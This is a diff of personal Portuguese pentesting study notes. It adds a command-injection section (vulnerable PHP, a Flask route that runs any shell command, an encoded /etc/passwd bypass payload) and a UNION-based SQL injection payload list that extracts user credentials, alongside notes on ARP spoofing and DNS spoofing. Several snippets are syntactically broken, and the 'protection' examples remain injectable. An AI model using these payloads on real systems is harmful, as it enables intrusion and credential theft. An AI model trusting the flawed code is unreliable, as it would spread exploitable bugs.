@@ -232,8 +232,60 @@ $ nc -zv <ip> 1-90              # Nc will scan port 1 until 90
         $ apt-get-install mitmf  => no kali linux
         $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]    => ex: mitm --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
         $ arp - a           => no pc da vítima antes e depois do ataque, veremos que o endereço MAC foi alterado
+#Command_injection Injeção de comando
+           Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.
+```php
+// The $title is injectable
+<?php
+$songs "/var/www/html/songs"
 
+if (isset $_GET["title"])) {
+	$title = $_GET["title"];
+	
+	$command "grep $title /var/www/html/songtitle.txt";
+	
+	$search = exec($command);
+	if ($search == "") {
+		&return = "<p>The requested song</p><p> $title does </p><b>not</b><p>exist!</p>";
+	} else {
+		$return = "<p>The requested song</p><p> $title does </p><b>exist!</b>";
+	}
 
+	echo $return;
+?>
+```
+```python
+# 1. We use a route in the webserver that will execute whatever is provided. For example, to execute `whoami`, we'd need to visit http://flaskapp.com/whoami
+import subprocess
+From flask import Flask
+
+app = Flask(__name___)
+def execute_command(shell):
+	return subprocess.Popen(shell, shell=True,stdout=subprocess.PIPE).stdout.read()
+
+@app.route('/<shell>')
+def command_server(shell):
+	return execute_command(shell)
+```
+```php
+// Protecting our program against command injection
+<input type="text" id="ping" name="ping" pattern="[0-9]+"></input>  
+
+<?php
+	echo passthru("/bin/ping -c 4 "$_GET["ping"]');
+?>
+```
+```php
+
+// Protecting our program against command injection
+<?php
+	if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {
+}
+?>
+
+// Bypassing filters anti Command Injection
+$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+```
 #DNS_Spoofing:
       * O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
       * A ferramenta setoolkit é capaz de mandar emails para vítimas com nomes de outras pessoas. Dessa forma, ao passarmos um link com nome de outra pessoa, um usuário comum se tornará vulnerável ao ataque, uma vez que a mensagem parece ter sido enviada por um usuário confiável. No arquivo harvester que está no diretório /var/www/html deveremos ver o usuário e senha que digitamos.
@@ -276,17 +328,22 @@ $ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
   #SQL_Injection:
       * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
       * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.
-        $ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
-        $ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
-        ! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
-        $ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
-          Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
-        $ No lab 3 utilizamos ' UNION SELECT NULL,NULL,NULL-- ou ' ORDER BY 1,2,3 -- para determinar a quantidade de colunas existentes na tabela do banco de dados
-          No lab 4 utilizamos " ' UNION SELECT 'a',NULL,NULL,NULL-- " ou " ' UNION SELECT NULL,'a',NULL,NULL-- " para saber qual coluna da tabela contem tipos string, caso ela não contesse iria levantar uma exceção de erro interno 
-          Um ataque realizado no lab 5 do PortSwigger foi completado ao colocar " ' UNION SELECT * FROM users -- " na URL em frente category=    
-          No lab 6 tivemos que usar concatenação de colunas, com 'category=Gifts' UNION SELECT NULL, username || '~' || password FROM users --'
-          No lab 7 conseguimos pegar a versão da base de dados Oracle por meio do comando " ' UNION SELECT * FROM v$version, dual -- " (Note que cada base de dados tem uma forma de mostrar a versão ver documentação da portSwigger)(Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual) 
-          No lab 8 tivemos que usar o Burp Suite e digitar '+UNION+SELECT+@@version,+NULL# e enviar a requisição http, note que antes disso usamos '+UNION+SELECT+'abc','def'# para sabermos quais tabelas aceitam tipos str e no caso as duas aceitaram
+
+https://wanderication.medium.com/tryhackme-sql-injection-a261106cf392
+https://medium.com/@Aircon/sql-injection-tryhackme-thm-f712548fc198
+
+```sql
+1 UNION SELECT 1
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,database()
+`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
+
+' OR 1=1;--
+```
 Ver: https://portswigger.net/web-security/sql-injection/cheat-sheet
      https://portswigger.net/web-security/sql-injection/union-attacks
      https://portswigger.net/web-security/sql-injection/examining-the-database
@@ -306,11 +363,7 @@ Ver: https://portswigger.net/web-security/sql-injection/cheat-sheet
            Seu parâmetro no sqlmap: B
         => Union-query based - Baseada no UNION
            Situação vista na aula anterior, em que é possível unir dois SELECTs que possibilitam fazer duas consultas.
-           Seu parâmetro no sqlmap: U
-        => Command injection - injeção de comando
-           Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.
-           Seu parâmetro no sqlmap: Q
-        => 
+           Seu parâmetro no sqlmap: U 
       * Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
         $ String usuario=request.getParameter("usuario");
         $ String senha=request.getParameter("senha");
@@ -322,13 +375,6 @@ Ver: https://portswigger.net/web-security/sql-injection/cheat-sheet
         $ stmt.setString(1,usuario);
         $ stmt.setString(2,senha);
         $ stmt.execute();
-        -> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
-        Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
-        No kali: > ifconfig eth0 down 
-                 > ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
-        No server:
-                 > ifconfig eth0 down 
-                 > ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
         https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 #Brut_force_attack:
